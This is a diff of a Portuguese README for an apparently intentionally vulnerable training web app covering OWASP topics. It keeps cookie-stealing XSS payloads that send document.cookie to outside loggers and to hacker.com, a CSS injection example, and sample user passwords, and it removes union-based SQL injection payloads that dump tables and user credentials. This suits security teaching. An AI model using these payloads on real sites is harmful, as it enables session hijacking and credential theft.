@@ -11,19 +11,7 @@ Requisitos:
 
 ## Rodar a aplicação
 
-### 1. Subir o banco de dados utilizando o Docker Compose. Rodar o comando abaixo na pasta raíz do projeto.
-```
-docker-compose up
-```
-
-### 2. Criação do banco de dados.
-
-- Entrar na pasta **dvsn** e executar o script:
-```bash
-$ ./create-database.sh
-```
-
-### 3. Entrar na pasta do front (dvsn/front) e dar build no projeto, para que os arquivos sejam colocados na pasta estática da api.
+### 1. Entrar na pasta do front (dvsn/front) e dar build no projeto, para que os arquivos sejam colocados na pasta estática da api.
 
 NPM:
 ```
@@ -34,6 +22,19 @@ YARN:
 ```
 yarn
 yarn build
+```
+
+### 2. Subir as aplicações utilizando o Docker Compose. Rodar o comando abaixo na pasta raíz do projeto.
+```
+docker-compose up
+```
+Obs.: Caso queira subir apenas o banco de dados, é necessário comentar as demais aplicações no docker-compose.yml.
+
+### 3. Criação do banco de dados.
+
+- Entrar na pasta **dvsn** e executar o script:
+```bash
+$ ./create-database.sh
 ```
 
 ### 4. Abrir o VS Code ou IntelliJ e rodar a aplicação.
@@ -48,16 +49,12 @@ Main Class -> RootApplication.java
 |amy@mail.com|d8578edf8458ce06fbc5bb76a58c5ca4|qwerty|Não|
 |janis@mail.com|46f94c8de14fb36680850768ff1b7f2a|123qwe|Não|
 
-## Comandos extras:
-Gerar certificado para o servidor apache2.
-```sh
-openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
-```
+## Hints:
+- [Certificados](./docs/hints/certificates.md)
 
 ## Assuntos abordados:
 
 - OWASP TOP 10
-- XSS
 - CSRF
 - Cookies (HttpOnly, Secure, SameSite)
 - Alguns cuidados com LocalStorage e SessionStorage
@@ -68,18 +65,10 @@ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certifi
 - NodeJS/JavaScript: <a href="https://www.npmjs.com/package/yarn-audit-html">yarn audit html report</a>
 
 ## Vulnerabilidades
-- SQL Injection
-    - Login
-    - Pesquisa de usuários
-- XSS
-    - Reflected
-        - /hello?nome=Bob
-    - DOM
-        - Filtro na listagem de POSTS
-    - Stored
-        - Comentários dos posts    
+- [SQL Injection](./docs/vulns/sql-injection.md)
+- [XSS](./docs/vulns/xss.md)
 - Cookie
-    - É apenas um base64 e a aplicação confia no que o cliente envia.
+    - É apenas um base64 e a aplicação confia no que o cliente enviar.
 
 fetch('https://servidor-de-log.free.beeceptor.com/todos?cookie=' +  document.cookie)
 fetch('http://logger.crescer.lab/?cookie=' +  document.cookie)
@@ -101,39 +90,12 @@ fetch('http://logger.crescer.lab/?cookie=' +  document.cookie)
   </script>
 </svg>
 ```
-- SQL Injection (Login)
-- SQL Injection (Lista de usuários)
-```sql
-' union select 1, '2', '3', '4', '5', '6', 1, now(), now()--
-```
-```sql
-' union select floor(random() * 1000), '2', table_name, '4', '5', '6', 1,now(), now() from information_schema.tables where table_schema = 'public'--
-```
-```sql
-' union select floor(random() * 1000), table_name, column_name, '4', '5', '6', 1,now(), now() from information_schema.columns where table_schema = 'public'--
-```
-```sql
-' union select floor(random() * 1000), '2', string_agg(column_name,','), '4', '5', '6', 1,now(), now() from information_schema.columns where table_name = 'usuario'--
-```
-```sql
-' union select floor(random() * 1000), '2', concat(email,' ' ,senha), '4', '5', '6', 1,now(), now() from usuario--
-```
 
-https://github.com/payloadbox/sql-injection-payload-list
 - CSS Injection
 /hello?nome=Teste#red;margin-left:50px;background-image:url('http://localhost:8080/favicon.ico')
 - expression(document.write('<iframe src=" .= "http://hacker.com?cookie=' + document.cookie.escape() + " />'))
 background-image: url(javascript:alert('XSS'))
 https://www.mediawiki.org/wiki/Preventing_XSS_Attacks_through_CSS_Whitelisting
-
-## TODO
-- <s>Prevenção de XSS configurável.</s>
-- <s>Prevenção de SQL Injection configurável.</s>
-- <s>Adicionar XSS em SVG e CSS.</s>
-- <s>Validar tipos de autenticação e adicionar Token Opaco.</s>
-- Adicionar cabeçalhos CSP e X-Frame-Options configuráveis.
-- Adicionar certificados SSL.
-
 
 ## Exemplos de vulnerabilidades:
 - <a href="https://security.snyk.io/vuln/SNYK-JS-MATERIALIZECSS-2324800">XSS materialize-css</a>
